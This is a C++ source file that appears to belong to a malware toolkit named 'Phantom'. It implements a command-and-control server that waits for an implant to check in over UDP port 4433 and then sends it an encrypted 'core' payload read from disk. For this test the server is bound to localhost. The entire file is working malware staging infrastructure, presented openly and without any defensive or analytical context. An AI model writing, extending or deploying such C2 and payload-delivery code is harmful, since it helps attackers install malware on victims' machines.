#include "common/network.h"
#include <iostream>
#include <fstream>
#include <vector>
#include <thread>

using namespace Phantom;

int main() {
    // Bind to 127.0.0.1 for local test
    Network::Transport transport("127.0.0.1", 4433);
    std::cout << "[*] C2 Server listening on UDP 4433..." << std::endl;

    while (true) {
        std::vector<uint8_t> req = transport.receive_packet();
        if (!req.empty()) {
            std::cout << "[+] Received check-in. Sending encrypted core..." << std::endl;

            std::ifstream input("core_payload.enc", std::ios::binary);
            if (!input.is_open()) {
                std::cerr << "[-] Error: core_payload.enc not found!" << std::endl;
                break;
            }
            std::vector<uint8_t> data((std::istreambuf_iterator<char>(input)), std::istreambuf_iterator<char>());
            input.close();

            transport.send_packet(data);
            std::cout << "[+] Core sent." << std::endl;
            break;
        }
    }
    return 0;
}
